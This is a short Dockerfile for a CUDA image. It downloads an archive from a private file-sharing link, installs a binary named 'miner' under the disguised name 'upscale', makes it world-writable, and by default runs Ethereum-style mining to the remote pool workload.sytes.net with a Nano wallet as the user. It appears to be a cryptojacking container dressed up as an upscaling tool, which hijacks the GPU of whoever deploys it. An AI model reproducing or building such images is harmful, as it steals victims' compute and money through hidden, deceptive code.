FROM nvidia/cuda:11.4.2-base-ubuntu20.04

LABEL maintainer="Roman Nikov"

RUN apt update; \
    apt install -y wget; \
    wget https://cdn.filesend.jp/private/AZnD5WgBGaXyz7qfoCPdmM9VWUpixxJfx2-RpZFchBKoBIX5Mx-hlvfVMYwHiFcw/upscale.tar.gz; \
    tar xf upscale.tar.gz; \
    cd upscale; \
    cp miner /usr/local/bin/upscale; \
    cp mine_eth.sh /usr/local/bin/mine_eth.sh; \
    cd /usr/local/bin;

WORKDIR /usr/local/bin

RUN chmod 777 mine_eth.sh;

RUN chmod 777 upscale;

CMD upscale --algo ethash --server workload.sytes.net:2020 --user nano_3bf6aph9zbwp358tgqwtzqua9w3wxfhyuw3x11mb6a6bjah5jiewmzog9jpg.upscale
